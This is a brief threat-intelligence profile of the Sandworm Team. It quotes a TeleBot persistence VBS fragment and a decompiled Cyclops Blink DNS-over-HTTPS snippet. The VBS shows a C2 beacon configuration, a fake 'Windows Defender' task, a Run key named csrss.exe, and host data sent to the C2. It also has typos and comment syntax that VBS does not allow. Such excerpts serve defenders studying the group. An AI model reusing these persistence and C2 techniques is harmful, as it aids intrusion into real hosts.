# Sandworm Team

## Features

1. To prevent the TeleBot backdoor from being deleted, the organization also attached a VBS script to regain access to the target host.

```vbs
?Dim version: version = "6.1.76.5"
'===================== WORK PARAMS =======
Dim timeout:timeout = 21  //Call the server every 21 minutes
Dim bIP:bIP = "IP"  //C2 server IP address
'============= WORK PARAMS =========================
Dim sRequest:sRequest = ""
Dim taskName:taskName = "Windows Defender"
Dim arKey:arKey ="HKCU\Software\Microsoft\Windows\CurrentVersion\Run\csrss.exe"
//Insert Process
'========================WORK PARAMS===========================
Dim pUlrl : pUrl = "https://" + bTP + "/services/nI-nl/power-bi-embedded/wt_mc_id/azuremktg_hp_powerbiembedded"
Dim sendUrl: sendUrl = "https://" + bIP + "/store/mseea/nl_NL/cat/Back-to-School/categoryID_68073200"
Dim htmlUrl:htmlUrl = "https://" + bIP + "/store/mseea/nl_NL/cat/Accessoires/categoryID_66233400?"
//Send computer name and MAC address to C2 server
'================ WORK PARAMS =======================
```

2. Cyclops Blink malware uses DNS over HTTPS to perform DNS resolution, and then uses HTTPS to download files.

```C
j_sprintf(
  vll,
  "PosT /dns-query HTTP/1.1\r\n"
  "Host: dns.google\r\n"
  "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0\r\n"
  "Accept: application/dns-message\r\n"
  "Content-Type: application/dns-message\r\n"
  "Content-Length: %d\r\n"
  "\r\n",
  v13);
v12=j_strlen(vll);
```
